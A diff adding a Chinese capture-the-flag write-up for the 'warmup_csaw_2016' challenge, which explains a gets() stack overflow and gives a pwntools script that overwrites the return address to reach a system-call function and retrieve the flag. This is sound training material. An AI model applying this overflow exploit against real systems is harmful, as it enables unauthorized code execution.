@@ -56,3 +56,35 @@ cat flag #直接输出flag即可
 
 ![](https://paper.tanyaodan.com/BUUCTF/rip/5.png)
 
+------
+
+### [warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)
+
+先`file ./test`查看文件类型和`checksec --file=test`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/1.png)
+
+用`IDA Pro 64bit`打开`warmup_csaw_2016`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v5`中，`v5`的长度只有`0x40f`，即可用栈大小只有`64`字节，但是`gets()`并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/2.png)
+
+在`Functions window`可以看到有一个`sub_40060D()`函数，按`F5`反汇编可以看到这是一个系统调用，且`sub_40060D()`函数的起始地址为`0x40060D`。
+
+![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/3.png)
+
+编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25282`，发送`payload`即可得到`flag{31eb59d1-1c21-4440-96a5-b12276f75a41}`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 25282)
+payload = b'a'*(0x40 + 0x8) + p64(0x40060D)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/4.png)
+
+------
+
+### 
